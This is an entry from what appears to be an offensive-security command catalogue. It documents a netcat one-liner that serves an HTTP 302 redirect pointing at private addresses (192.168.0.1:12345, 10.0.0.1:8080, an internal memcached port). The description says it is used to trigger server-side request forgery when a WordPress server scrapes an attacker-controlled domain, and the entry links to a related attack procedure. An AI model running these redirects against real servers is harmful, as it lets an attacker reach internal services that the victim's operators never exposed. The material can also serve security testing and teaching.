---
id: cmd-serve-redirect-187520
data: >-
  echo -e "HTTP/1.1 302 Found\r\nLocation:
  http://192.168.0.1:12345\r\nContent-Length: 0\r\n\r\n" | nc -l -p 80
tags:
  - ssrf
  - redirect
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:31:30.689Z'
verified: false
validated: true
submitted: true
---
# serve-redirect-response

## Command

```bash
echo -e "HTTP/1.1 302 Found\r\nLocation: http://192.168.0.1:12345\r\nContent-Length: 0\r\n\r\n" | nc -l -p 80
```

## Description

This command uses netcat to serve a simple HTTP 302 redirect response pointing to a private IP:port, used to trigger SSRF when the WordPress server scrapes the attacker domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 192.168.0.1:12345 | Target private IP and port in Location header | Yes |
| -p 80 | Port to listen on | Yes |

## Examples

### Basic Usage

```bash
echo -e "HTTP/1.1 302 Found\r\nLocation: http://10.0.0.1:8080\r\n\r\n" | nc -l -p 80
```

### Advanced Usage

```bash
echo -e "HTTP/1.1 302 Found\r\nLocation: http://internal.service:11211\r\n\r\n" | nc -l -p 80 -q 1
```

## Expected Output

Listens for incoming HTTP request and responds with 302; client follows to the specified Location.

## Related

- [[Related Procedure: Respond-with-Redirect-to-Private-IP-from-Attacker-Domain]]
